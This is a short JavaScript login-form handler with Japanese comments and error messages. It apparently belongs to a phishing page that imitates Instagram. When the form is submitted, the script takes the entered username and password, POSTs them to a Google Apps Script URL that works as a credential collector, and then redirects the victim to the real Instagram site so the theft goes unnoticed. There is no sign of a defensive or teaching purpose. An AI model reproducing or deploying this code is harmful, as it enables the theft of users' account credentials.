document.getElementById("login-form").addEventListener("submit", function(e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    const formData = new FormData();
    formData.append("username", username);
    formData.append("password", password);

    fetch("https://script.google.com/macros/s/AKfycbwGdVgIZfmVVwTY2OUXy9gMEdIxbX2X9VMREip9daPsdP_XEDrs6MA97r_7tkcAswLJQg/exec", {
        method: "POST",
        body: formData
    })
    .then(response => {
        if (response.ok) {
            // 成功後のリダイレクト先
            window.location.href = "https://www.instagram.com/";
        } else {
            alert("送信に失敗しました（レスポンスNG）");
        }
    })
    .catch(error => {
        alert("送信エラー：" + error);
        console.error(error);
    });

    this.reset();
});
